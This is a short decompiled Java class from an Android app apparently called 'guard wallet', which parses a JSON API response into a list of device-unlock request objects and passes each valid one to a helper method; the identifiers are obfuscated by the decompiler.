package com.guard.wallet.helper;

import a1.AbstractC0026q;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.List;

/* renamed from: com.guard.wallet.helper.i */
/* loaded from: classes.dex */
public abstract class AbstractC0186i {
    /* renamed from: a */
    public static void m355a(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        try {
            ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(str, new TypeToken<ApiResult<List<ReqUnlockDeviceVO>>>() { // from class: com.guard.wallet.helper.LockCipherHelper$1
            });
            if (apiResult == null || !apiResult.getSuccess().booleanValue() || apiResult.getData() == null || ((List) apiResult.getData()).isEmpty()) {
                return;
            }
            for (ReqUnlockDeviceVO reqUnlockDeviceVO : (List) apiResult.getData()) {
                if (AbstractC0252h.m716t(reqUnlockDeviceVO)) {
                    AbstractC0252h.m682C(reqUnlockDeviceVO);
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.i", e2);
        }
    }
}
